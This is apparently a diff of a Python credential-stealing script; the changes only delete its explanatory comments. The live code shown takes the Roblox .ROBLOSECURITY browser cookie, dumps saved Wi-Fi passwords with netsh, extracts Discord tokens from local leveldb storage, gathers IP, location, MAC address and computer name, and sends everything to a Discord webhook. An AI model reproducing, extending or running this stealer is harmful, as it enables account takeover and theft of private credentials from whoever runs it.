@@ -5,14 +5,14 @@ import subprocess
 
 def GetWifiPasswords():
     try:
-        # Execute the system command to retrieve Wi-Fi passwords
+
         result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
         output = result.stdout
 
-        # Find all Wi-Fi profiles
+
         profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
 
-        # Retrieve passwords for each Wi-Fi profile
+     
         wifi_passwords = []
         for profile in profiles:
             result = subprocess.run(["netsh", "wlan", "show", "profile", "name=" + profile, "key=clear"], capture_output=True, text=True)
@@ -53,7 +53,6 @@ def GetMacAddress():
         result = subprocess.run(["getmac", "/FO", "CSV", "/NH"], capture_output=True, text=True)
         output = result.stdout.strip()
 
-        # Extract the MAC address from the output
         mac_address = output.split(",")[0].replace('"', '')
 
         return mac_address
@@ -127,7 +126,6 @@ def SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords, ip_address,
 def Main():
     webhook_url = "Webhook url here"
 
-    # Get the .ROBLOSECURITY cookie
     roblosecurity_cookie = None
     cookies = browser_cookie3.load()
     for cookie in cookies:
@@ -138,23 +136,23 @@ def Main():
     if roblosecurity_cookie:
         print(".ROBLOSECURITY:", roblosecurity_cookie)
 
-        # Get Wi-Fi passwords
+
         wifi_passwords = GetWifiPasswords()
 
-        # Get public IP address and networking information
+
         ip_address, isp, city, region, country = GetPublicIPAddress()
 
-        # Get MAC address
+     
         mac_address = GetMacAddress()
 
-        # Get Discord token
+       
         discord_token = subprocess.run(["powershell", "-Command", "Get-Content -Path $env:APPDATA\\discord\\Local Storage\\leveldb\\*.ldb | Select-String -Pattern 'oken' | %{$_.Matches} | %{$_.Value}"], capture_output=True, text=True).stdout.strip()
 
-        # Get computer name
+
         computer_name = subprocess.run(["powershell", "-Command", "$env:COMPUTERNAME"], capture_output=True, text=True).stdout.strip()
 
         if ip_address is not None:
-            # Send data to Discord webhook
+     
             SendToDiscord(webhook_url, roblosecurity_cookie, wifi_passwords, ip_address, isp, city, region, country, discord_token, mac_address, computer_name)
         else:
             print("Public IP address not available")
